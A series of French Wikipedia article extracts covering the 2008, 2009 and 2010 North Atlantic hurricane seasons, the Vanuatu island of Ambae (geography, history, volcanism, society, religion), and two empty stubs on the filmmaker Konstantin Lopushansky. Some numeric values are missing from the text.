Cependant, c'est le quatuor de la tempête tropicale Fay et des ouragans Gustav, Hanna et Ike qui a dominé la saison. En effet, ces quatre systèmes se sont succédé sur les Grandes Antilles et le golfe du Mexique, du milieu d'août au début de septembre, pour causer quelques centaines de morts. Fay a inondé la Floride durant quatre jours. La Nouvelle-Orléans a échappé belle au passage de Gustav qui menaçait de reproduire un désastre similaire à celui de l'ouragan Katrina en 2005. L'île de Galveston (Texas) a pratiquement été rasée par l'ouragan Ike et la ville Houston a été fortement endommagée. Ike est le coûteux ouragan pour son bassin cyclonique. Mais c'est Haïti qui a particulièrement été touchée, les pluies diluviennes successives dévastant le pays, en particulier la région des Gonaïves.
Les cyclones tropicaux suivants ont eu des effets minimaux, sauf Kyle qui a donné des pluies diluviennes aux provinces maritimes et à l'est du Québec au Canada; et Omar qui affecta le sud des Antilles. Avec l’ouragan Paloma, la saison cyclonique 2008 est devenue la seule saison avec un ouragan majeur par mois durant cinq mois consécutifs.
Noms des tempêtes 2008.
La liste des noms qui sera utilisée pour nommer les tempêtes qui se formeront dans le bassin cyclonique de l'océan Atlantique Nord durant l'année 2008 sera la même que celle de la saison 2002, à l'exception d"'Ike" et de "Laura" qui remplaceront les noms "Isidore" et "Lili". Les noms qui ne sont pas retirés de cette liste seront à nouveau utilisés lors de la saison 2014.
Records.
Ouragan Bertha : pour son bassin cyclonique,
Tempête tropicale Fay : pour son bassin cyclonique,
Tempête tropicale Marco :
Effets.
A Cuba, les destructions causées par les cyclones sont évalués par le dirigeant Raúl Castro à 10 milliards de dollars (7,9 milliards d'euros). 500 000 foyers ont été affectés, de canne à sucre ont été détruits et ont été inondés.

</doc>
<doc id="568768" url="https://fr.wikipedia.org/wiki?curid=568768" title="Ambae">
Ambae

Ambae (autrefois Opa, Aoba ou île aux Lépreux) est une île du Vanuatu, située en mer de Corail. Elle fait partie, avec Maewo et l'île de Pentecôte, de la province de Penama.
Probablement habitée dès la période Lapita, l'île se développe au cours des siècles en deux parties distinctes, l'est et l'ouest, qui ont chacune leur organisation sociale propre et ne parlent pas la même langue (l'ambae de l'Est et l'ambae de l'Ouest). Revendiquée par la France après que Louis-Antoine de Bougainville y accoste en 1768, Ambae n'est colonisée qu'un siècle plus tard, principalement par des missionnaires anglicans et par des marchands. Comme le reste du Vanuatu, elle est intégrée aux Nouvelles-Hébrides, colonie franco-britannique, entre 1906 et 1980. En 1994, son seul centre urbain, Saratamata, devient le chef-lieu de la province de Penama.
Le Manaro Voui, volcan qui culmine à au centre de l'île, se réveille en 1995. Une éruption majeure, en 2017-2018, contraint l'ensemble de la population à évacuer, et le gouvernement du Vanuatu enjoint aux habitants de s'installer durablement sur les îles voisines. En 2020, 80 % de la population est revenue vivre sur l'île. Sa population est alors voisine de habitants sur une superficie de 402 km carrés.
L'économie d'Ambae repose principalement sur l'agriculture et la pêche vivrière, et sur l'artisanat. L'île est dotée d'un hôpital, de trois aérodromes et d'une couverture de téléphonie à 90 %, mais le reste de ses infrastructures est plus sommaire. La production d'électricité est à 95 % d'origine photovoltaïque.
Les rites traditionnels d'Ambae varient selon les régions de l'île et certains restent pratiqués dans la seconde moitié du . Évangélisée à partir de la fin du , l'île compte aujourd'hui de nombreuses congrégations chrétiennes, principalement anglicanes, pentecôtistes et adventistes.
Géographie.
Topographie.
Ambae est une île basaltique située à l'ouest des îles Maewo et Pentecôte, dans l'archipel du Vanuatu, qui est composé de 83 îles. Ambae est la neuvième plus grande île de l'archipel, avec . Le volcan Manaro Voui (aussi appelé Lombenben), en son centre, culmine à , avec à son sommet deux cratères, dont le plus petit contient trois lacs, Manaro-Ngoru, Manaro-Voui et Manaro-Lakua. Un second sommet, le mont Voutnavouele, culmine à . L'île est recouverte de forêt jusqu'à environ d'altitude, et habitée jusqu'à .
Environnement.
Ambae, comme le reste du Vanuatu, connaît deux saisons : une fraîche et sèche de mai à octobre, et une chaude et humide de novembre à avril, avec des cyclones fréquents. L'archipel est particulièrement menacé par la montée du niveau de la mer et l'acidification des océans. Le Ministère de l'adaptation au changement climatique, qui possède un bureau dans chaque province, en ouvre un en 2021 à Saratamata, seule ville d'Ambae et chef-lieu de la province de Penama.
Ambae abrite de nombreuses espèces d'oiseaux, parmi lesquelles le lori des palmiers et le . La zone protégée de Duviara, créée en 1996 et s'étendant sur , abrite douze espèces endémiques de plantes et une espèce endémique de poissons d'eau douce. Plusieurs espèces invasives se développent à Ambae, notamment des plantes : sensitive et sensitive géante, liane américaine, aubergine sauvage, "Sida acuta", "Senna tora" et "Merremia peltata".
Toponymie.
Anciennement, Ambae s'est appelée Opa, Aoba et « île aux Lépreux » ("" en anglais).
Histoire.
Époque pré-coloniale.
L'île semble avoir été habitée dès le . La présence de la culture Lapita est attestée au Vanuatu, mais trouver des vestiges significatifs sur Ambae semble peu probable, compte tenu de l'activité volcanique. On y trouve en revanche des tessons de poterie de plusieurs époques, entre différentes couches de dépôts volcaniques. Ces poteries sont datées entre 1850 et 1530 ans avant notre ère pour les plus anciennes. Très semblables à celles qu'on trouve sur les autres îles du nord du Vanuatu, elles permettent de mettre en lumière les échanges anciens entre Ambae et d'autres îles, notamment Malekula et Santo, et les zones où les habitants ont pu se réfugier lors d'éruptions.
Selon la tradition orale, Ambae aurait été habitée vers 1400 par le dieu Tangaroa, venu de Samoa. Ambae devient alors un lieu de pèlerinage pour les populations des îles voisines, notamment Malekula.
Traditionnellement, l'île est divisée entre l'est et l'ouest, qui parlent deux langues distinctes et ont des coutumes différentes. Dans l'ouest, la filiation et l'héritage sont patrilinéaires, tandis qu'à l'est, comme au nord de l'île de Pentecôte, la filiation est matrilinéaire et l'épouse va vivre à proximité de la famille de son mari (patrilocalité). À Longana, village à l'est de l'île, la polygamie est courante, et certains chefs peuvent avoir jusqu'à dix femmes ; la dixième n'a pas de rapports sexuels avec son mari, et s'occupe de lui préparer ses repas, afin de prévenir les empoisonnements. La polygamie est abolie avec l'évangélisation.
Colonisation.
Après que l'archipel du Vanuatu a été localisé par Pedro Fernandes de Queirós en 1606, Louis-Antoine de Bougainville est le premier Européen à accoster sur Ambae, en 1768. Confondant les tatouages des habitants avec la lèpre, il baptise Ambae « île aux Lépreux ». Bien que revendiquée par la France, l'île n'attire pas tout de suite les colons, jusqu'à la découverte de bois de santal dans le sud du Vanuatu. Les premiers colons, des missionnaires anglicans, s'installent dans les années 1860-1870 à Lolowai et Longana, dans l'est de l'île.
Les marins qui passent à proximité de l'île sont parfois victimes d'attaques de la population locale, notamment des meurtres rituels, jusqu'à ce qu'un navire britannique riposte en incendiant Longana. Les cérémonies traditionnelles semblent s'amplifier à mesure que les contacts avec les Européens s'intensifient, avec une apothéose dans les années 1860. Les habitants ne sont pas épargnés par le "blackbirding", forme de traite qui a cours dans le Pacifique jusqu'aux années 1900 : des autochtones sont trompés ou enlevés de force, puis emmenés dans le Queensland ou aux Fidji pour travailler dans les plantations de canne à sucre. Comme le reste du Vanuatu, Ambae est intégrée aux Nouvelles-Hébrides, colonie franco-britannique créée en 1906. Jusqu'aux années 1930, la population maintient un mode de vie largement traditionnel, avec des cellules familiales réduites vivant dans des hameaux. Les conflits avec les colons sont alors quotidiens.
Lors de la Seconde Guerre mondiale, l'aviso "Chevreuil" des Forces navales françaises libres est envoyé aux Nouvelles-Hébrides et aux Îles Banks par le commandant de la Marine dans le Pacifique, le capitaine de frégate Georges Cabanier, pour des missions de visite et de maintien de l'ordre. Commandé par l'enseigne de vaisseau Fourlinnie, il fait un passage à Ambae entre le 10 et le .
Le Vanuatu prend son indépendance le 30 juillet 1980. En 1994, il est divisé en six provinces. Ambae, Maewo et l'île de Pentecôte forment la province de Penama, dont le chef-lieu est Saratamata, à Ambae.
Regain d'activité volcanique.
Après une longue période de dormance, le Manaro Voui entre en éruption les 2 et 3 mars 1995. Le 27 novembre 2005, une éruption contraint environ la moitié de la population à évacuer. Des éruptions de moindre importance ont lieu en 2011 et 2016.
Le 6 septembre 2017, une éruption majeure contraint à l'évacuation de l'ensemble de la population (environ , dont ) vers les îles voisines de Maewo, Pentecôte et Espiritu Santo. Il s'agit de la plus importante éruption dans l'histoire récente d'Ambae. Les pluies acides, les nuages de cendres et les vents violents détruisent la plupart des habitations et polluent les sources d'eau potable. La population retourne peu à peu s'installer à Ambae à partir d'octobre 2017, mais une nouvelle éruption a lieu en avril 2018. Les cendres, poussées par les vents violents causés par le , recouvrent l'île et contraignent encore une fois les habitants à évacuer.
Compte tenu des risques, le gouvernement du Vanuatu décide d'installer durablement la population d'Ambae sur Maewo. Les personnes déplacées connaissent des difficultés économiques importantes, notamment les éleveurs et cultivateurs, qui ont perdu leurs principaux moyens de subsistance. Une partie de la population revient sur l'île au cours de 2018, et en janvier 2019, treize écoles d'Ambae rouvrent leurs portes. En février 2020, l'île a retrouvé 80 % de sa population. En juin de la même année, l'administration du chef-lieu de Penama, temporairement déplacée sur l'île de Pentecôte, rouvre ses bureaux à Saratamata.
Population et société.
Démographie.
Ambae compte en 2016 et en 2020. Il y a légèrement plus d'hommes que de femmes, et la majorité de la population a moins de 18 ans.
En 2020, la majorité de la population se déclare anglicane, excepté dans le canton ouest, où l'Église apostolique domine. De nombreux autres cultes chrétiens existent sur l'île, dans l'ordre d'importance : différentes dénominations liées aux Églises de Dieu, l'Église adventiste du septième jour, l'Église catholique, les Assemblées de Dieu, l'Église de Jésus-Christ des saints des derniers jours, les Neil Thomas Ministries et l'Église presbytérienne. Sur l'ensemble des personnes interrogées, aucune ne se déclare adepte des religions traditionnelles ou athée.
Économie.
En 2016, la principale source de revenus des habitants d'Ambae est la vente de produits issus de la pêche, de l'agriculture ou de l'artisanat. L'agriculture représente une part importante de l'économie, et la plupart des foyers cultivent au moins des bananes, du manioc et de l'aibika ; les autres végétaux cultivés sont la papaye, l'igname, la patate douce, le taro, le kava, la noix de coco, le cacao, le maïs, et pour une petite part seulement le café. L'élevage de poules, cochons, vaches et chèvres est très répandu. En 2016, l'ouest d'Ambae compte le plus grand nombre d'élevage de poules de l'ensemble de Penama. Certains foyers pratiquent la sylviculture. Les principales essences cultivées sont le nangai, le santal, le badamier et l'acajou.
Le tourisme est peu développé.
Infrastructures.
L'île est largement rurale, avec pour seul centre urbain Saratamata, au nord-est. En 2016, 92 % de l'île est couverte par le réseau mobile, et 90 % de la population utilise un téléphone portable. En revanche, moins de 1 % de la population regarde la télévision, et entre 1 et 5 % utilise Internet, à l'exception du quart nord-est de l'île, où le pourcentage monte à 20 %. Plus de 95 % de la population utilise l'énergie solaire comme principale source d'électricité, et la quasi-totalité cuisine au feu de bois. Selon les régions de l'île, 90 % à 97 % de la population n'a pas accès à des sanitaires modernes.
L'île compte un hôpital et trois aérodromes.
Culture.
Langues.
Deux langues vernaculaires sont parlées sur l'île : l'ambae de l'Est et l'ambae de l'Ouest. L'ambae de l'Est (aussi appelé "omba", "oba", "aoba" et "walurigi") compte environ en 1981 ; l'ambae de l'Ouest (aussi appelé "opa"), environ en 1983. Bien qu'il s'agisse à l'origine de langues orales, elles ont été transposées à l'écrit, notamment pour traduire des textes chrétiens. L'anglais et le bichelamar, langues officielles du Vanuatu, sont les deux langues véhiculaires.
Cuisine.
Le taro, l'igname et les bananes font partie du régime traditionnel et sont cultivés depuis des siècles, et la culture de la noix de coco est particulièrement importante. La boisson traditionnelle est le kava. Plus récemment ont été introduits la patate douce, l'aibika et le manioc. La cuisine traditionnelle comprend aussi de la viande, notamment du porc.
Religion.
Rites traditionnels.
Avant l'évangélisation du Vanuatu, les rites et croyances varient grandement d'une île à l'autre de l'archipel ; à Ambae, des différences existent entre les sociétés patrilinéaires, à l'ouest, et matrilinéaires, à l'est. La séparation entre hommes et femmes y est traditionnellement moins prononcée que dans d'autres îles. Il arrive que des femmes soient encouragées à sacrifier des cochons ou admises dans des sociétés exclusivement masculines ailleurs, et que les hommes participent aux rites organisés par les femmes, comme la célébration des premières règles ou les tatouages corporels. Comme dans le reste du Vanuatu, le sacrifice de cochon à dent est un élément cultuel et symbolique important à Ambae.
La mythologie d'Ambae comporte deux figures principales : Takaro, avatar local de la divinité polynésienne Tangaroa qui est connu sous des noms variés à travers le Vanuatu ; et Mwerambuto ou Nggelevu, divinité locale. Contrairement à d'autres îles, comme Malekula ou Efate, on ne trouve pas d'idoles ni de représentations des défunts dans les cultes traditionnels d'Ambae. En revanche, les offrandes de nourriture sont pratiquées pour éviter que les esprits ne dérangent les vivants, et certaines personnes sont supposées posséder des pouvoirs conférés par des fantômes ou des esprits variés. La mort d'une personne est suivie d'une période de cent jours, appelée "bongi", durant laquelle ont lieu des banquets, des discours et des offrandes au défunt. Cette pratique existe ailleurs en Mélanésie, et reste pratiquée au Vanuatu dans la seconde moitié du .
Avant l'évangélisation, il existe aussi à Ambae des cultes secrets et initiatiques ayant pour but l'obtention de pouvoirs magiques, grâce à l'invocation d'esprits mauvais et à des pratiques normalement proscrites (exhibitionnisme, inceste, sodomie ou contact avec du sang menstruel). Ces pratiques prédominent parmi les populations à filiation matrilinéaire d'Ambae et d'autres îles. La christianisation met un terme à ces cultes, assimilés à de la sorcellerie.
Évangélisation.
L'île est évangélisée à partir des années 1870, principalement par des missionnaires anglicans. À partir de 1881, un accord est passé avec les communautés presbytériennes, également présentes dans l'archipel, et les anglicans se concentrent sur Ambae, Maewo et l'île de Pentecôte. La Mission Anglicane Mélanésienne, basée à Lolowai, dans le nord-est de l'île, y implante une église, un hôpital et des écoles. Les terrains nécessaires auraient été pris en compensation du meurtre d'un missionnaire, le révérend Charles Godden, assassiné en 1906. Ce meurtre, attesté, est perpétré par un homme nommé Alamemea, victime du "blackbirding". Emmené de force en Australie pour travailler dans une plantation de canne à sucre puis emprisonné et torturé, il s'était juré de tuer tout homme blanc qu'il verrait dès son retour à Ambae.
Dans les années 1930, dans un contexte de tensions et de combats entre différents chefs, certains habitants se tournent vers les missionnaires pour régler les conflits et assurer leur protection. De leur côté, les missionnaires tolèrent le sacrifice des cochons et la consommation de kava.
Jusqu'à l'indépendance du Vanuatu en 1980, les livres de prières traduits en ambae et distribués par les missionnaires comportent des prières pour la reine d'Angleterre et le président de la France, comme dans le reste du pays. En 2020, la population se déclare en très grande majorité chrétienne, mais les croyances et rites traditionnels ont encore une certaine influence.
Ambae dans la culture.
Le romancier américainn James A. Michener, en station au Vanuatu pendant la Seconde Guerre mondiale, s'est inspiré d'Ambae pour l'île fictive Bali Hai, qui apparaît dans son livre "".
Voir aussi.
Bibliographie.
 : livres et articles utilisés pour la rédaction.

</doc>
<doc id="568770" url="https://fr.wikipedia.org/wiki?curid=568770" title="Saison cyclonique 2009 dans l'océan Atlantique nord">
Saison cyclonique 2009 dans l'océan Atlantique nord

La saison cyclonique 2009 dans l'océan Atlantique nord est une série modérée de cyclones tropicaux formés depuis l'océan Atlantique. Bien que la dépression tropicale Un se soit formée le , la saison débute officiellement le juin 2009 et se termine le 30 novembre. Le dernier cyclone de la saison, Ouragan Ida se dissipe le 10 novembre. La saison 2009 recense un total de deux dépressions tropicales, sept tempêtes tropicales, un ouragan de catégorie 2 (Ida) et deux ouragans majeurs (en catégorie 3, l'ouragan Fred, en catégorie 4, l'ouragan Bill). L'inactivité saisonnière est due au développement d'un événement El Niño modéré dans le Pacifique. Celui-ci amène des conditions défavorables à la formation de cyclones tropicaux au-dessus de l'Atlantique nord. Cette saison égalise provisoirement, en attendant la fin définitive et la ré-analyse de la saison, le record du plus faible nombre d'ouragans. Malgré tout, quatre cyclones ont affecté les terres, ce qui n'est pas négligeable au vu de la faible activité : l’ouragan Bill qui a atteint la catégorie 4 de l’échelle de Saffir-Simpson, Fred la catégorie 3, Ida la catégorie 2 et la tempête tropicale Danny. Seul "Ida" a frappé la côte avec la force d'un ouragan de façon certaine alors que l'intensité de "Bill" était à la limite entre tempête tropicale et ouragan de force 1 quand il a touché Terre-Neuve.
Bilan.
L'activité est la plus faible depuis 1997. Ceci est la conséquence de l'événement El Niño. Aucun cyclone n'est détecté durant les mois de juin et de juillet. En moyenne, un cyclone tropical est observé tous les deux ans. La dernière fois fut en 2008. Depuis 1944, 13 années ne connaissent aucune activité en juillet, la dernière fois en 2004. Le mois d'août devient un peu plus actif que la moyenne. Cela est principalement dû à Bill.
Septembre est un mois peu actif, le moins actif depuis septembre 1994. Le nombre de cyclones, deux, est proche de la moyenne. Pourtant, le mois d'octobre est peu actif, car ce sont des cyclones à courte durée de vie.
Noms des tempêtes 2009.
La liste des noms utilisée pour nommer les tempêtes qui se formèrent dans le bassin cyclonique de l'océan Atlantique Nord durant l'année 2009 est la même que celle de la saison 2003, à l'exception de "Fred", d’"Ida" et de "Joaquin". Ces derniers remplacent les noms "Fabian", "Isabel" et "Juan" retirés à cause de leur impact en 2003. Les noms qui ne sont pas retirés de la liste de 2009 seront à nouveau utilisés lors de la saison 2015.
Cyclones tropicaux.
Dépression tropicale Un.
Un système cyclonique orageux désorganisé se forme au large de la Caroline du Nord au-dessus du Gulf Stream. Après avoir atteint des vents maximums soutenus de et une pression centrale de , elle s'est rapidement transformée en une dépression extratropicale à cause du fort cisaillement des vents en altitude et de son passage au-dessus de températures de la mer plus froides. Dès le 29 mai en après-midi, la National Hurricane Center américain a envoyé son dernier bulletin à propos de ce système. La dépression tropicale Un n'a eu aucun effet sur terre mais son précurseur a donné de la pluie et de légers vents à la côte de Caroline du Nord.
Tempête tropicale Ana.
Une dépression tropicale se forme durant le à partir d'une onde tropicale venant de la région des îles du Cap-Vert. Le système a atteint brièvement le statut de tempête tropicale, le 12 août, moment où le "National Hurricane Center" lui a donné le nom d'Ana. Le 13 août, le système est redevenu une dépression tropicale et a perdu une bonne partie de ses orages mais après une réorganisation le 14, Ana est retourné au niveau de tempête tropicale le 15 août près des îles Sous-Le-Vent. Elle a atteint une intensité maximale avec une pression centrale de et des vents soutenus de avant de faiblir définitivement sous un cisaillement des vents d'altitude en croissance le 16 août et elle s'est dissipée le 17 en passant près de Porto Rico.
Ouragan Bill.
Une onde tropicale sortant de la côte africaine le 12 août 2009 est entrée sur l’Atlantique. Le National Hurricane Center (NHC) américain commenta dans son bulletin tropical que ce système était accompagné d’une zone orageuse d’assez grand diamètre et qu’il avait un bon potentiel de développement. L’onde a rapidement organisé les orages en un système en rotation fermée au sud des îles du Cap-Vert le 13 août. Les orages ont subi une légère désorganisation le 14 août mais le NHC a déterminé (tôt le jour suivant) que le système était en train de devenir une dépression tropicale qui reçut le nom de "Tempête tropicale 3" plus tard en journée à à l'ouest-sud-ouest des îles du Cap-Vert. À la suite d'une intensification rapide, la dépression est devenue la tempête tropicale Bill le même jour. Même si la tempête avait peu d’orages près de son centre, elle commençait à être entourée par des bandes pluvieuses et tôt le 16 août les prévisionnistes du NHC prévoyaient que Bill deviendrait un ouragan.
Bill est devenu un ouragan de catégorie 1 de l’échelle de Saffir-Simpson tôt le 17 août 2009 alors qu'il se trouvait à à l'est des Petites Antilles dans un environnement très favorable à son développement : faible cisaillement vertical des vents et température de surface de la mer à . Tard le même jour, un œil est devenu visible sur les images du satellite météorologique. La convection profonde dans les bandes orageuses de Bill et une divergence des vents en altitude lui ont permis de devenir de catégorie 2 le 18 août, juste avant un remplacement du mur de l’œil.
Tempête tropicale Claudette.
Le 11 août, le National Hurricane Center (NHC) a repéré une onde tropicale où on retrouvait des orages assez désorganisés à environ à l’Est des Petites Antilles. Bien que l’onde se déplaçait lentement vers l’Ouest, le HNC ne prévoyait pas de développement immédiat du système. Le 12 et le 13, la convection persistait mais un fort cisaillement des vents avec l’altitude ne permettait pas une organisation plus poussée alors que l’onde est passée sur Hispaniola. Tôt le 14 août, un creux barométrique en altitude est entré en interaction avec l’onde au-dessus des îles Turques-et-Caïques et le 15, les orages se sont alignés autour d’un centre de rotation alors que le système passait sur les Keys de Floride.
Tôt le 16 août, les conditions devinrent favorables à un développement rapide et une circulation cyclonique était analysable sur les cartes de surface à au sud-ouest de Tampa Bay. Le NHC a classé ce système plus tard en journée comme la dépression tropicale Quatre, tout en mentionnant qu’elle devrait atteindre le statut de tempête tropicale dans les douze heures. Contournant l’anticyclone subtropical et se dirigeant vers le nord, elle est effectivement devenue la tempête tropicale Claudette à 11h heure locale (), le radar météorologique NEXRAD de Tallahassee montrant que les vents avaient atteint autour du centre.
Tempête tropicale Danny.
Une onde tropicale est sortie de la côte ouest de l'Afrique le 20 août et a commencé à montrer des signes de rotation cyclonique le jour suivant. Elle avait des orages épars et se dirigeait vers l'ouest. Tôt le 22 août, la convection profonde s'est estompée légèrement car les conditions ne lui était pas favorables. La position du centre de la circulation était peu définie et les orages en demeuraient séparés au cours des jours suivants alors que la trajectoire du système prenait une direction plus vers le nord-ouest. Le 25 août, le cisaillement des vents commença à faiblir ce qui aida les orages à s'intensifier près de l'onde qui ne montrait toujours pas une circulation fermée.
Cette perturbation tropicale avec des orages peu organisés est finalement devenue une circulation fermée et une tempête tropicale à à l'est de Nassau aux Bahamas vers 15 TU le 26 août 2009. Cependant, selon le National Hurricane Center, les caractéristiques de Danny était seulement marginalement plus tropicales que subtropicales. Son organisation laissant à désirer, les premières estimations de son développement et de sa trajectoire était très incertaines. Un avion de reconnaissance envoyé en après-midi a rapporté qu'il n'y avait pas de bandes orageuses en son centre et que les plus forts vents, de 40 à étaient à environ au nord de ce dernier.
Tempête tropicale Erika.
Montrant des signes d'organisation suffisants pour que le National Hurricane Center américain classe "Erika" officiellement tempête tropicale le septembre, ce système peine à se structurer. Son centre ne peut être localisé avec précision lorsqu'il traverse la Guadeloupe dans la nuit du 2 au 3 septembre.
Si les vents ne font aucun dégât significatif, ce sont les pluies très abondantes qui poussent Météo-France à mettre les départements français des petites Antilles en alerte orange (Alerte cyclonique pour Saint-Martin et la Guadeloupe, fortes pluies orageuses pour la Martinique). On relèvera ainsi après 36 heures des cumuls de pluie pouvant atteindre sur La Désirade et localement sur la Guadeloupe. Saint-Martin, contrairement aux prévisions, ne recevra guère plus de de pluie.
La tempête se dissipe le 3 septembre dans la soirée alors qu'elle aborde Porto Rico.
Ouragan Fred.
L’ouragan Fred, de catégorie 3, est le plus intense qui se soit formé à l’est de et aussi au sud dans les annales du National Hurricane Center. Il s'agissait seulement du troisième ouragan majeur à atteindre le niveau d’ouragan majeur si près de l'Afrique. "Fred" s'est dissipé en mer sans causer de dégâts mais son humidité s'est déplacée vers la côte sud-est des États-Unis où elle a servi à alimenter un système pluvieux intense deux semaines plus tard, causant des inondations en Géorgie.
Dépression tropicale Huit.
La dépression tropicale Huit est le huitième système tropical de la saison 2009 dans l'Atlantique nord. Elle s'est formée dans une onde tropicale à l'ouest des îles du Cap-Vert le 25 septembre 2009. Bien que les prévisionnistes du National Hurricane Center américain ait estimé qu'elle devienne brièvement une tempête tropicale, elle s'est déplacée vers le nord-ouest sur des eaux plus froides et ce potentiel ne s'est jamais réalisé. La dépression est redevenue une onde tropicale le 26 septembre et n'a donné que quelques rafales de vent mineures aux îles du Cap-Vert sans toucher directement à aucune terre.
Tempête tropicale Grace.
Le 27 septembre, une large dépression des latitudes moyennes, née le long d’un front, était à à l'est de Cape Race (Terre-Neuve). Le lendemain, le système devenait occlus et se dirigeait vers le sud-est à une vitesse de 22 à . Le octobre la dépression occluse vira vers le nord-est et commença à décrire une boucle anti-horaire sur les Açores. Le 2 octobre, son centre forma une circulation plus compacte de de rayon qui se détacha du reste de la dépression. Durant un jour et demi, des orages épars se sont développés. Les images du satellite météorologique, vers le 3 octobre, montraient que l’air chaud entourait le centre, une caractéristique tropicale, et que la zone frontale s’en détachait. Douze heures plus tard, ce cyclone extratropical était devenu tropical à environ de Lajes aux Açores, sans passer par un stage subtropical. En effet, le centre de circulation en surface était détaché de tout centre en altitude et son rayon était très petit, favorisant un développement rapide de la convection.
En passant au large des Açores, "Grace" développa un mur de convection autour de ce qui ressemblait à un œil tard le 4 octobre. Il accéléra vers l’est puis vers le nord et devint enchâssé dans un flux d’altitude du sud-ouest. "Grace" a atteint son maximum de force de vent à () vers le 5 octobre. Elle est ensuite entrée sur des eaux de surface de plus en plus froides et a été capturée par une zone frontale vers 06h TU le 6 octobre. Le système devint extratropical à environ ouest-sud-ouest de Cork, Irlande. La petite dépression a traversé la mer Celtique et s’est dissipée le 7 octobre vers lorsqu’elle approchait des côtes du pays de Galles.
Tempête tropicale Henri.
La "tempête tropicale Henri" n'a pas causé de dommage. Elle est née le 6 octobre d'une perturbation tropicale qui s'approchait du nord des Petites Antilles. Le National Hurricane Center américain la classe tempête tropicale alors qu'elle était à au large d'Antigua-et-Barbuda le 7 septembre.
La tempête se déplace ensuite dans une zone de fort cisaillement des vents de haute altitude et d'eau plus froide. Henri va dégénérer graduellement en dépression tropicale, puis se dissipe le 8 alors que son centre passe à au nord de Saint-Barth. Le 9 septembre, les restes sont absorbés par un front froid.
Ouragan Ida.
Une dépression tropicale s'est formée à à l'est de la côte du Nicaragua et prend un stade de tempête tropicale très rapidement. La NOAA l'appelle Ida. Ida progresse vers le large et atteint le stade d'ouragan de catégorie 1 en passant sur la côte est du Nicaragua, puis, elle rétrograde en dépression tropicale dans les terres du Honduras. Ida remonte au nord et parvient à retourner en tempête tropicale, puis en ouragan de catégorie 1 avant de se diriger vers la péninsule du Yutacàn et passe à à l'est de Cancùn en catégorie 2. Puis, Ida rétrograde en catégorie 1 puis en tempête tropicale loin au-dessus du sud-est du Mexique, retourne quelques heures en catégorie 1, puis revient en tempête tropicale sur le sud des États-Unis (Louisiane/Mississippi). Elle longe alors la côte de l'Alabama et devient une tempête extratropicale en entrant dans les terres au nord-ouest de la Floride.
Chronologie des événements.
La saison 2009 a débuté tôt avec la dépression tropicale Un le 28 mai, mais le reste de la saison a été plutôt calme. En effet, les deux mois suivants n’ont vu aucun système se développer et il a fallu attendre le 12 août pour que la tempête tropicale Anna se forme près des îles du Cap-Vert. Il s’agissait du premier système tropical à recevoir un nom si tardivement depuis la saison 1992.
Après cette première tempête, trois cyclones se sont formés coup sur coup en août : l’ouragan "Bill", la tempête tropicale "Claudette" et la tempête tropicale "Danny". Puis en septembre et au début d’octobre, il y a eu quelques cyclones mais seulement l'ouragan Fred a été important. Ainsi, le mois de septembre a connu une activité historiquement faible. Après un hiatus d'un mois, l’"ouragan Ida" s'est formé dans la mer des Caraïbes pour terminer la saison.

</doc>
<doc id="568771" url="https://fr.wikipedia.org/wiki?curid=568771" title="Constantin Lopouchanski">
Constantin Lopouchanski



</doc>
<doc id="568773" url="https://fr.wikipedia.org/wiki?curid=568773" title="Konstantin Lopushansky">
Konstantin Lopushansky



</doc>
<doc id="568778" url="https://fr.wikipedia.org/wiki?curid=568778" title="Saison cyclonique 2010 dans l'océan Atlantique nord">
Saison cyclonique 2010 dans l'océan Atlantique nord

La saison cyclonique 2010 dans l'océan Atlantique nord s'est déroulée du juin 2010 au , selon la définition de l'Organisation météorologique mondiale (OMM). Elle liste une vingtaine de cyclones à la suite d'une Niña saisonnière modérée. La saison cyclonique 2010 est, après celles de 1995 et 1887, est la troisième plus longue liste cyclonique, avec 19. L'activité cyclonique 2010 de l'Atlantique nord a surpassé la saison cyclonique de la même année dans le nord-ouest de l'océan Pacifique.
La saison a débuté avec l'ouragan Alex, une tempête de catégorie 2 sur l'échelle de Saffir-Simpson, qui a frappé la péninsule du Yucatán en tant que tempête tropicale au nord-est du Mexique et au sud des frontières du Texas à un très fort pic d'intensité. Après Alex, une série de tempêtes de faible intensité se sont succédé entre le mois de juillet et le mois d'août. Durant août et septembre, la saison devient active avec la formation de onze cyclones durant une quarantaine de jours, six étant des ouragans capverdiens. Quatre de ces ouragans capverdiens (Danielle, Earl, Igor et Julia) se sont intensifiés en catégorie 4, dont un cinquième (Karl) a atteint le stade d'ouragan majeur. Danielle et Earl, tous les deux se succédant, ont été les ouragans les plus violents de la saison, suivis de tempêtes tropicales de faible intensité, ainsi que d'une série de trois autres ouragans majeurs qui se sont également succédé. Du 21 août au 26 septembre, aucune journée se passait sans qu'il y ait au moins un cyclone tropical en activité durant 36 jours, à commencer par la formation de la dépression tropicale Six (plus tard devenue Ouragan Danielle) et en finissant par la dissipation de la dépression tropicale Lisa, la plus longue période depuis la saison cyclonique 2005 dans l'océan Atlantique nord.
Noms des tempêtes 2010.
La liste des noms utilisée pour nommer les tempêtes s'étant formée dans le bassin cyclonique de l'océan Atlantique nord durant l'année 2010 est la même que celle de la saison 2004, à l'exception de "Colin", de "Fiona", d"'Igor" et de "Julia" qui remplacent les noms "Charley", "Frances", "Ivan" et "Jeanne". Les noms qui n'ont pas été retirés de cette liste seront à nouveau utilisés lors de la saison 2016. À cause des dégâts causés par "Igor" et "Tomas", ces noms ont été retirés et seront remplacé par "Ian" et "Tobias" pour la saison 2016.
Cyclones tropicaux.
Ouragan Alex.
L'Ouragan Alex a été le premier cyclone tropical lors de la saison cyclonique 2010 dans l'océan Atlantique nord. Il s'est formé le 25 juin 2010 dans la mer des Caraïbes et a frappé le Belize en tant que tempête tropicale. Vers le 30 juin, lors de son passage au-dessus du Golfe du Mexique, Alex s'est développé en ouragan. Il a causé la mort de 33 personnes. Alex est le premier ouragan à s'être formé en juin depuis l'ouragan Allison en 1995, le plus puissant en termes de vitesse du vent depuis l'ouragan Alma en 1966. Avec 947 HPa il est l'ouragan le plus intense après l'ouragan Audrey en 1957. Il est donc le deuxième ouragan le plus intense, en juin, de l'Atlantique.
Dépression tropicale Deux.
Durant le 3 juillet, le jour après la dissipation d'Alex, une onde tropicale forme deux zones de convection à l'ouest de la mer des Caraïbes. Le lendemain, le système montre les signes d'une organisation. Après avoir traversé la péninsule du Yucatán et entre dans le Golfe du Mexique.
Tempête tropicale Bonnie.
Au début du mois de juillet, une onde tropicale se forme à partir des côtes africaines. Le 17 juillet, elle montre des signes de développement localisée au nord-est des Petites Antilles.
Tempête tropicale Colin.
